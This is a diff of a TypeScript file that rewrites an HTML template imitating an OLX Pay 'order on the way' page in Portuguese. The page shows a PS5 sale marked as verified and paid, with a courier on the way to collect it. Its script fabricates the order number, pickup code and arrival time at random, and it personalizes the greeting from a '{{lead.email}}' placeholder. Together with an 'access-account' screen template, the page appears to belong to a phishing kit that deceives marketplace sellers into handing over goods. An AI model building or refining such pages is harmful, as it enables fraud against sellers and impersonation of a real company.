@@ -503,201 +503,222 @@ const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Detalhes da venda - OLX</title>
+<title>Pedido a caminho - OLX</title>
 <style>
   *,*::before,*::after{box-sizing:border-box}
-  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;min-height:100%}
-  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column}
-  header.topbar{position:sticky;top:0;z-index:20;background:#fff;border-bottom:1px solid #ececec;display:flex;align-items:center;gap:16px;padding:16px}
+  html,body{margin:0;padding:0;background:#f5f5f5;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;min-height:100%}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#fff}
+  /* Topbar */
+  header.topbar{position:sticky;top:0;z-index:20;background:#fff;border-bottom:1px solid #ececec;display:flex;align-items:center;gap:14px;padding:14px 16px}
   header.topbar .back{display:inline-flex;padding:4px;background:none;border:0;cursor:pointer;color:#1a1a1a}
-  header.topbar h2{margin:0;font-size:18px;font-weight:600;color:#1a1a1a}
-  main{flex:1;padding:20px 20px 40px}
-  h1.page-title{font-size:24px;font-weight:700;margin:0;color:#1a1a1a}
-  .pedido-row{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:14px;color:#1a1a1a}
-  .copy-btn{background:none;border:0;padding:2px;cursor:pointer;color:#6E0AD6;display:inline-flex}
-  .pedido-date{font-size:14px;color:#1a1a1a;margin:4px 0 0}
-  .divider{border-top:1px solid #ececec;margin:20px 0 0}
-  .product{display:flex;align-items:center;gap:16px;width:100%;padding:20px 0;background:none;border:0;text-align:left;cursor:pointer;color:inherit;font:inherit}
-  .product img,.product .placeholder{height:64px;width:80px;flex-shrink:0;border-radius:6px;object-fit:cover;background:linear-gradient(135deg,#1a1a2e,#0e4ea8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:16px}
-  .product .title{flex:1;font-size:16px;font-weight:500;color:#1a1a1a}
-  .product .arrow{color:#6E0AD6}
-  .section{padding-top:24px}
-  .section h2{font-size:20px;font-weight:700;color:#1a1a1a;margin:0}
-  .info-row{display:flex;align-items:center;gap:12px;margin-top:16px;font-size:14px;color:#1a1a1a}
-  .pill-blue{display:inline-flex;align-items:center;gap:6px;background:#e0f1fb;padding:6px 10px;border-radius:6px;font-size:14px;color:#1a1a1a}
-  .alert{display:flex;gap:12px;background:#fff8e6;border:1px solid rgba(217,160,40,.4);border-radius:8px;padding:12px;margin-top:12px}
-  .alert .alert-icon{flex-shrink:0;color:#b76e00;margin-top:2px}
-  .alert p{margin:0 0 12px;font-size:14px;line-height:1.5;color:#1a1a1a}
-  .alert p:last-child{margin:0}
-  .link-box{display:flex;align-items:center;gap:8px;background:#fff;border:1px solid rgba(217,160,40,.4);border-radius:6px;padding:8px;margin-top:12px}
-  .link-box .link-icon{color:#b76e00;flex-shrink:0}
-  .link-box .link-text{flex:1;font-size:12px;font-weight:500;color:#1a1a1a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-  .link-box button{background:#6E0AD6;color:#fff;border:0;border-radius:9999px;padding:6px 14px;font-size:12px;font-weight:600;cursor:pointer}
-  .tip-link{display:inline-block;margin-top:14px;font-size:14px;font-weight:600;color:#6E0AD6;text-decoration:none}
-  .btn-primary{display:block;width:100%;margin-top:20px;padding:14px;background:#f48120;color:#fff;border:0;border-radius:9999px;font-size:16px;font-weight:600;cursor:pointer;box-shadow:0 1px 2px rgba(0,0,0,.05)}
-  .timeline{display:grid;grid-template-columns:36px 1fr;gap:16px;margin-top:24px}
-  .tl-col{display:flex;flex-direction:column;align-items:center}
-  .tl-icon{width:36px;height:36px;border-radius:50%;background:#f48120;color:#fff;display:flex;align-items:center;justify-content:center}
-  .tl-line{width:2px;flex:1;background:#f48120;min-height:24px}
-  .tl-dot{width:12px;height:12px;border-radius:50%;background:#f48120}
-  .tl-spacer{height:24px}
-  .tl-text{display:flex;flex-direction:column}
-  .tl-text .top{font-size:16px;font-weight:700;color:#1a1a1a;margin:0}
-  .tl-text .top-sub{font-size:14px;color:#6b6b6b;margin:2px 0 0}
-  .tl-text .bottom{margin-top:auto;padding-top:24px}
-  .tl-text .bottom p{margin:0;font-size:16px;color:#1a1a1a}
-  .tl-text .bottom .sub{font-size:14px;color:#6b6b6b;margin-top:2px}
-  .pay-list{margin-top:16px;display:flex;flex-direction:column;gap:12px;font-size:16px}
-  .pay-row{display:flex;justify-content:space-between;align-items:center;color:#1a1a1a}
-  .pay-row.total{font-weight:700}
-  .buyer{display:flex;align-items:center;justify-content:space-between;margin-top:16px;padding:8px 0}
-  .buyer-left{display:flex;align-items:center;gap:12px}
-  .buyer-avatar{width:44px;height:44px;border-radius:50%;background:#d4d8e0;color:#56627a;font-size:16px;font-weight:600;display:flex;align-items:center;justify-content:center}
-  .buyer-name{margin:0;font-size:16px;font-weight:600;color:#1a1a1a}
-  .buyer-link{margin:2px 0 0;font-size:14px;font-weight:500;color:#6E0AD6}
-  .buyer-msg{padding:4px;color:#6E0AD6;background:none;border:0;cursor:pointer;display:inline-flex}
-  .help-nav{margin-top:40px;display:flex;flex-direction:column;align-items:center;gap:20px}
-  .help-nav a{font-size:16px;color:#1a1a1a;text-decoration:none}
-  .legal-nav{margin-top:24px;display:flex;flex-direction:column;align-items:center;gap:16px}
-  .legal-nav a{font-size:14px;color:#1a1a1a;text-decoration:none}
-  .copyright{margin-top:32px;font-size:12px;font-style:italic;color:#6b6b6b;text-align:center;line-height:1.45}
-  .social{margin-top:32px;display:flex;align-items:center;justify-content:center;gap:28px;color:#1a1a1a}
-  .social a{color:inherit}
+  header.topbar h2{margin:0;font-size:16px;font-weight:600;color:#1a1a1a}
+  /* HERO */
+  .hero{position:relative;background:linear-gradient(180deg,#f25c2a 0%,#ee4d23 100%);color:#fff;padding:32px 24px 0;overflow:hidden}
+  .hero .logo{display:flex;align-items:center;justify-content:center;gap:8px;font-size:18px;font-weight:700;letter-spacing:.3px}
+  .hero .logo svg{height:26px;width:26px}
+  .hero h1{margin:18px 0 6px;font-size:28px;font-weight:800;letter-spacing:.5px;text-align:center;line-height:1.1}
+  .hero .order-id{display:block;text-align:center;font-size:14px;font-weight:500;opacity:.95;letter-spacing:.5px}
+  .hero-illu{position:relative;height:140px;margin-top:18px}
+  .hero-illu .wave{position:absolute;left:-10%;right:-10%;bottom:50px;height:40px;background:#f9a48a;border-radius:50% 50% 0 0/100% 100% 0 0;opacity:.55}
+  .hero-illu .wave2{position:absolute;left:-15%;right:-15%;bottom:40px;height:30px;background:#fbb89e;border-radius:50% 50% 0 0/100% 100% 0 0;opacity:.4}
+  .moto-svg{position:absolute;right:12px;bottom:0;width:200px;height:130px}
+  .hero-bottom-fade{height:14px;background:#fff}
+  /* Greeting + tracker */
+  .greet{padding:22px 20px 6px}
+  .greet h2{margin:0 0 6px;font-size:18px;font-weight:700}
+  .greet p{margin:0;font-size:14px;color:#525866;line-height:1.5}
+  .tracker{padding:24px 16px 8px;background:#fff}
+  .tracker .rail{position:relative;display:grid;grid-template-columns:repeat(5,1fr);gap:0;align-items:start}
+  .tracker .line{position:absolute;left:10%;right:10%;top:14px;height:2px;background:#e3e6ec;z-index:0}
+  .tracker .line .fill{position:absolute;left:0;top:0;bottom:0;width:62%;background:#117a3a}
+  .step{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;gap:6px;text-align:center;padding:0 4px}
+  .step .dot{width:30px;height:30px;border-radius:50%;background:#fff;border:2px solid #d2d6df;color:#525866;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700}
+  .step.done .dot{background:#117a3a;border-color:#117a3a;color:#fff}
+  .step.active .dot{background:#f25c2a;border-color:#f25c2a;color:#fff;box-shadow:0 0 0 6px rgba(242,92,42,.15)}
+  .step .lbl{font-size:11px;color:#1a1a1a;font-weight:600;line-height:1.25;max-width:62px}
+  .step.muted .lbl{color:#9097a6;font-weight:500}
+  /* CTA + ETA */
+  .cta-wrap{display:flex;justify-content:center;padding:18px 16px 6px}
+  .cta{background:#1a1a1a;color:#fff;border:0;border-radius:9999px;padding:14px 32px;font-size:15px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
+  .eta{margin:8px 16px 0;text-align:center;font-size:13px;color:#ee4d23;font-weight:600}
+  /* Sections */
+  section.block{margin:18px 16px 0;background:#fff;border:1px solid #ececec;border-radius:14px;padding:16px}
+  section.block h3{margin:0 0 12px;font-size:15px;font-weight:700;color:#1a1a1a;display:flex;align-items:center;gap:8px}
+  section.block h3 svg{color:#6E0AD6}
+  /* Product */
+  .prod{display:flex;gap:14px;align-items:center}
+  .prod .img{flex-shrink:0;width:84px;height:84px;border-radius:10px;background:linear-gradient(135deg,#1a1a2e,#0e4ea8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:18px;letter-spacing:.5px}
+  .prod .body{flex:1;min-width:0}
+  .prod .name{margin:0;font-size:15px;font-weight:600;color:#1a1a1a;line-height:1.35}
+  .prod .qty{margin:4px 0 0;font-size:12px;color:#6b7280}
+  .prod .price{margin:6px 0 0;font-size:16px;font-weight:700;color:#1a1a1a}
+  /* Address */
+  .addr p{margin:0;font-size:13px;color:#1a1a1a;line-height:1.5}
+  .addr .name{font-weight:700;margin-bottom:4px}
+  .addr .muted{color:#6b7280;margin-top:6px;font-size:12px}
+  /* Order details */
+  .row{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;padding:8px 0;border-bottom:1px dashed #ececec;font-size:13px}
+  .row:last-child{border-bottom:0}
+  .row .k{color:#6b7280}
+  .row .v{color:#1a1a1a;font-weight:600;text-align:right;word-break:break-word}
+  .row.copy .v{color:#6E0AD6;cursor:pointer;display:inline-flex;align-items:center;gap:6px}
+  .total{margin-top:6px;display:flex;justify-content:space-between;align-items:center;padding-top:12px;border-top:1px solid #ececec;font-size:16px;font-weight:800;color:#1a1a1a}
+  .total .v{color:#117a3a}
+  /* Reminder */
+  .reminder{margin:18px 16px 24px;background:#fff8e6;border:1px solid #f3d28a;border-radius:12px;padding:14px;display:flex;gap:12px}
+  .reminder svg{flex-shrink:0;color:#b76e00;margin-top:2px}
+  .reminder p{margin:0;font-size:12.5px;color:#1a1a1a;line-height:1.5}
+  .reminder strong{color:#b76e00}
+  /* Footer */
+  footer{padding:24px 16px 40px;text-align:center;color:#6b7280;font-size:11px;line-height:1.5}
+  /* Toast */
   .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);background:#1a1a1a;color:#fff;padding:10px 16px;border-radius:9999px;font-size:13px;opacity:0;pointer-events:none;transition:opacity .2s;z-index:50}
   .toast.show{opacity:1}
+  /* Pulse for moto */
+  @keyframes pulseDot{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.15);opacity:.85}}
+  .step.active .dot{animation:pulseDot 1.6s ease-in-out infinite}
 </style>
 </head>
 <body>
   <div class="wrap">
     <header class="topbar">
       <button type="button" class="back" aria-label="Voltar">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
       </button>
-      <h2>Meus Pedidos</h2>
+      <h2>Status do pedido</h2>
     </header>
 
-    <main>
-      <h1 class="page-title">Detalhes da venda</h1>
-      <div class="pedido-row">
-        <span>Pedido <span id="order-number">6985866921454226215</span></span>
-        <button type="button" class="copy-btn" id="copy-order" aria-label="Copiar número do pedido">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-        </button>
+    <!-- HERO -->
+    <div class="hero">
+      <div class="logo">
+        <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <rect width="40" height="40" rx="9" fill="#fff"/>
+          <text x="20" y="26" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="13" font-weight="800" fill="#6E0AD6">OLX</text>
+        </svg>
+        <span>OLX Pay</span>
       </div>
-      <p class="pedido-date" id="order-date">16/11/2025 20h32</p>
+      <h1>PEDIDO A CAMINHO</h1>
+      <span class="order-id" id="hero-order">#OLX-6985866921</span>
+      <div class="hero-illu">
+        <div class="wave"></div>
+        <div class="wave2"></div>
+        <!-- Motoboy SVG ilustrativo -->
+        <svg class="moto-svg" viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <!-- caixa atrás -->
+          <rect x="22" y="58" width="42" height="36" rx="4" fill="#b6371a"/>
+          <rect x="32" y="68" width="22" height="2" fill="#fff" opacity=".8"/>
+          <rect x="40" y="74" width="6" height="6" fill="#fff" opacity=".8"/>
+          <!-- corpo moto -->
+          <path d="M40 110 Q60 80 100 90 L150 90 Q170 90 178 105" stroke="#1a1a1a" stroke-width="6" fill="none" stroke-linecap="round"/>
+          <!-- assento -->
+          <rect x="95" y="78" width="40" height="14" rx="6" fill="#1a1a1a"/>
+          <!-- guidão -->
+          <path d="M150 90 L165 70 L182 72" stroke="#1a1a1a" stroke-width="5" fill="none" stroke-linecap="round"/>
+          <!-- frente -->
+          <path d="M155 78 L185 78 L190 95 L170 100 Z" fill="#ee4d23"/>
+          <!-- piloto corpo -->
+          <path d="M110 78 Q116 56 138 56 L148 56 L156 80 Z" fill="#ee4d23"/>
+          <!-- braço -->
+          <path d="M148 60 L168 70" stroke="#ee4d23" stroke-width="9" stroke-linecap="round" fill="none"/>
+          <!-- cabeça/capacete -->
+          <circle cx="138" cy="44" r="14" fill="#1a1a1a"/>
+          <path d="M126 44 Q126 32 138 32 Q150 32 150 44" fill="#ee4d23"/>
+          <rect x="128" y="40" width="20" height="6" rx="2" fill="#9ad8ff"/>
+          <!-- rodas -->
+          <circle cx="60" cy="115" r="18" fill="#1a1a1a"/>
+          <circle cx="60" cy="115" r="7" fill="#fff"/>
+          <circle cx="170" cy="115" r="18" fill="#1a1a1a"/>
+          <circle cx="170" cy="115" r="7" fill="#fff"/>
+        </svg>
+      </div>
+    </div>
 
-      <div class="divider"></div>
+    <!-- Greeting -->
+    <div class="greet">
+      <h2>Olá, <span id="user-name">{{lead.email}}</span>!</h2>
+      <p>Seu pedido <strong id="order-inline">#OLX-6985866921</strong> já foi verificado e está a caminho. Em breve o motoboy chega no endereço cadastrado para retirar o produto.</p>
+    </div>
 
-      <button type="button" class="product">
-        <div class="placeholder" aria-hidden="true">PS5</div>
-        <span class="title">Ps5 slim</span>
-        <span class="arrow"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span>
+    <!-- Tracker -->
+    <div class="tracker">
+      <div class="rail">
+        <div class="line"><div class="fill"></div></div>
+        <div class="step done"><div class="dot">✓</div><div class="lbl">Pedido recebido</div></div>
+        <div class="step done"><div class="dot">✓</div><div class="lbl">Pagamento</div></div>
+        <div class="step done"><div class="dot">✓</div><div class="lbl">Verificação</div></div>
+        <div class="step active"><div class="dot">4</div><div class="lbl">Motoboy a caminho</div></div>
+        <div class="step muted"><div class="dot">5</div><div class="lbl">Entregue</div></div>
+      </div>
+    </div>
+
+    <div class="cta-wrap">
+      <button type="button" class="cta">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        Rastrear pedido
       </button>
+    </div>
+    <p class="eta" id="eta-line">Estimativa de chegada: 35–50 minutos</p>
 
-      <div class="divider" style="margin-top:0"></div>
-
-      <section class="section">
-        <h2>Informações de envio</h2>
-        <div class="info-row">
-          <span>Entrega:</span>
-          <span class="pill-blue">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
-            Em mãos
-          </span>
+    <!-- Produto -->
+    <section class="block">
+      <h3>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
+        Produto
+      </h3>
+      <div class="prod">
+        <div class="img">PS5</div>
+        <div class="body">
+          <p class="name">PlayStation 5 Slim · Edição Digital</p>
+          <p class="qty">1 unidade · Em mãos</p>
+          <p class="price">R$ 2.350,00</p>
         </div>
-      </section>
-
-      <div class="divider"></div>
-
-      <section class="section">
-        <h2>Entrega pendente</h2>
-        <a href="#" class="tip-link">Dicas de segurança</a>
-
-        <button type="button" class="btn-primary">Entreguei o produto</button>
-
-        <div class="timeline">
-          <div class="tl-col">
-            <div class="tl-icon">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16.5 9.4 7.55 4.24"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
-            </div>
-            <div class="tl-line"></div>
-            <div class="tl-dot"></div>
-            <div class="tl-spacer"></div>
-          </div>
-          <div class="tl-text">
-            <div>
-              <p class="top">Entrega pendente</p>
-              <p class="top-sub" id="pending-date">16/11 20h33</p>
-            </div>
-            <div class="bottom">
-              <p>Venda realizada</p>
-              <p class="sub" id="sale-date">16/11 20h33</p>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      <div class="divider"></div>
-
-      <section class="section">
-        <h2>Pagamento</h2>
-        <div class="pay-list">
-          <div class="pay-row"><span>Valor do Produto</span><span>R$ <span id="prod-value">2350,00</span></span></div>
-          <div class="pay-row"><span>Tarifa de serviço</span><span>- R$ 0,00</span></div>
-          <div class="pay-row total"><span>Valor a receber</span><span>R$ <span id="receive-value">2350,00</span></span></div>
-        </div>
-      </section>
-
-      <div class="divider"></div>
-
-      <section class="section">
-        <h2>Contato com o comprador</h2>
-        <div class="buyer">
-          <div class="buyer-left">
-            <div class="buyer-avatar" id="buyer-initial">T</div>
-            <div>
-              <p class="buyer-name" id="buyer-name">Thierry</p>
-              <p class="buyer-link">Ver perfil</p>
-            </div>
-          </div>
-          <button type="button" class="buyer-msg" aria-label="Conversar com comprador">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
-          </button>
-        </div>
-      </section>
-
-      <nav class="help-nav">
-        <a href="#">Ajuda</a>
-        <a href="#">Dicas de segurança</a>
-        <a href="#">Sobre a OLX</a>
-        <a href="#">Vender na OLX</a>
-        <a href="#">Plano profissional</a>
-      </nav>
-
-      <div class="divider" style="margin-top:32px"></div>
-
-      <nav class="legal-nav">
-        <a href="#">Termos de uso</a>
-        <a href="#">Política de privacidade</a>
-        <a href="#">Propriedade intelectual</a>
-        <a href="#">Mapa do site</a>
-        <a href="#">Trabalhe conosco</a>
-        <a href="#">Grupo OLX</a>
-        <a href="#">ZAP imóveis</a>
-        <a href="#">Viva Real</a>
-      </nav>
-
-      <p class="copyright">© Bom Negócio Atividades de Internet Ltda. - Rua do Catete, 359, Flamengo - 22220-001 - Rio de Janeiro, RJ</p>
-
-      <div class="social">
-        <a href="#" aria-label="Facebook"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg></a>
-        <a href="#" aria-label="YouTube"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z"/><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"/></svg></a>
-        <a href="#" aria-label="TikTok"><svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5.8 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.84-.1z"/></svg></a>
-        <a href="#" aria-label="Instagram"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg></a>
-        <a href="#" aria-label="X"><svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2H21.5l-7.5 8.59L23 22h-6.81l-5.34-6.99L4.78 22H1.5l8.04-9.2L1 2h6.95l4.83 6.4L18.244 2zm-2.39 18h1.88L7.23 4H5.22l10.634 16z"/></svg></a>
-        <a href="#" aria-label="LinkedIn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-4 0v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
       </div>
-    </main>
+    </section>
+
+    <!-- Endereço -->
+    <section class="block addr">
+      <h3>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+        Endereço de retirada
+      </h3>
+      <p class="name">Endereço cadastrado pelo vendedor</p>
+      <p>O motoboy retirará o produto no endereço informado na sua conta. Mantenha o telefone por perto — ele entra em contato ao chegar.</p>
+      <p class="muted">Atualize seus dados em "Minha conta" se necessário.</p>
+    </section>
+
+    <!-- Detalhes -->
+    <section class="block">
+      <h3>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="9" y1="13" x2="15" y2="13"/><line x1="9" y1="17" x2="13" y2="17"/></svg>
+        Detalhes do pedido
+      </h3>
+      <div class="row copy" id="copy-row">
+        <span class="k">Número</span>
+        <span class="v">
+          <span id="order-number">6985866921454226215</span>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        </span>
+      </div>
+      <div class="row"><span class="k">Data</span><span class="v" id="order-date">Hoje · 20h32</span></div>
+      <div class="row"><span class="k">Pagamento</span><span class="v">OLX Pay · aprovado</span></div>
+      <div class="row"><span class="k">Modalidade</span><span class="v">Entrega em mãos · motoboy</span></div>
+      <div class="row"><span class="k">Código de retirada</span><span class="v" id="pickup-code">—</span></div>
+      <div class="total">
+        <span>Valor total</span>
+        <span class="v">R$ 2.350,00</span>
+      </div>
+    </section>
+
+    <!-- Reminder -->
+    <div class="reminder">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 1.8 20.5h20.4L12 3z"/><line x1="12" y1="10" x2="12" y2="14.5"/><line x1="12" y1="17.3" x2="12" y2="17.4"/></svg>
+        <p><strong>Lembrete:</strong> a OLX nunca cobra valores adicionais após a verificação. Confirme o código de retirada com o motoboy antes de entregar o produto. <strong>Não compartilhe esse código por mensagem.</strong></p>
+    </div>
+
+    <footer>
+      © Bom Negócio Atividades de Internet Ltda. — Rio de Janeiro, RJ<br>
+      Você pode fechar esta página. Avisos serão enviados por SMS e e-mail.
+    </footer>
   </div>
 
   <div class="toast" id="toast"></div>
@@ -711,28 +732,64 @@ const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
         t.classList.add('show');
         setTimeout(function(){ t.classList.remove('show'); }, 1800);
       }
-      var copyOrder = document.getElementById('copy-order');
-      if(copyOrder){
-        copyOrder.addEventListener('click', function(){
-          var n = document.getElementById('order-number').textContent || '';
-          if(navigator.clipboard){ navigator.clipboard.writeText(n).then(function(){ showToast('Pedido copiado!'); }, function(){ showToast('Não foi possível copiar'); }); }
-          else { showToast('Pedido copiado!'); }
-        });
+      // Order id aleatório bonitinho
+      var rnd = '';
+      for(var i=0;i<10;i++) rnd += Math.floor(Math.random()*10);
+      var label = '#OLX-' + rnd;
+      var heroEl = document.getElementById('hero-order');
+      var inlineEl = document.getElementById('order-inline');
+      if(heroEl) heroEl.textContent = label;
+      if(inlineEl) inlineEl.textContent = label;
+
+      // Código de retirada 6 dígitos
+      var code = '';
+      for(var k=0;k<6;k++) code += Math.floor(Math.random()*10);
+      var codeEl = document.getElementById('pickup-code');
+      if(codeEl) codeEl.textContent = code;
+
+      // Nome do usuário a partir do email (placeholder), com fallback
+      var nameEl = document.getElementById('user-name');
+      if(nameEl){
+        var raw = (nameEl.textContent || '').trim();
+        if(!raw || raw.indexOf('{{') === 0){ nameEl.textContent = 'tudo certo'; }
+        else {
+          var local = raw.split('@')[0] || raw;
+          local = local.replace(/[._-]+/g,' ');
+          local = local.charAt(0).toUpperCase() + local.slice(1);
+          nameEl.textContent = local;
+        }
       }
-      var copyLink = document.getElementById('copy-link');
-      if(copyLink){
-        copyLink.addEventListener('click', function(){
-          var l = document.getElementById('verif-link').textContent || '';
-          var orig = copyLink.textContent;
-          if(navigator.clipboard){ navigator.clipboard.writeText(l).catch(function(){}); }
-          copyLink.textContent = 'Copiado!';
-          setTimeout(function(){ copyLink.textContent = orig; }, 2000);
+
+      // Data hoje
+      var dEl = document.getElementById('order-date');
+      if(dEl){
+        var d = new Date();
+        var pad = function(n){ return n<10 ? '0'+n : ''+n; };
+        dEl.textContent = pad(d.getDate())+'/'+pad(d.getMonth()+1)+' · '+pad(d.getHours())+'h'+pad(d.getMinutes());
+      }
+
+      // ETA aleatório
+      var etaEl = document.getElementById('eta-line');
+      if(etaEl){
+        var min = 25 + Math.floor(Math.random()*15);
+        var max = min + 10 + Math.floor(Math.random()*10);
+        etaEl.textContent = 'Estimativa de chegada: ' + min + '–' + max + ' minutos';
+      }
+
+      // Copy número
+      var copyRow = document.getElementById('copy-row');
+      if(copyRow){
+        copyRow.addEventListener('click', function(){
+          var n = (document.getElementById('order-number')||{}).textContent || '';
+          if(navigator.clipboard){ navigator.clipboard.writeText(n).catch(function(){}); }
+          showToast('Número copiado!');
         });
       }
     })();
   </script>
 </body>
 </html>`;
+
 
 export const MANUAL_SCREEN_TEMPLATES: Record<string, { title: string; html: string }> = {
   "access-account": {
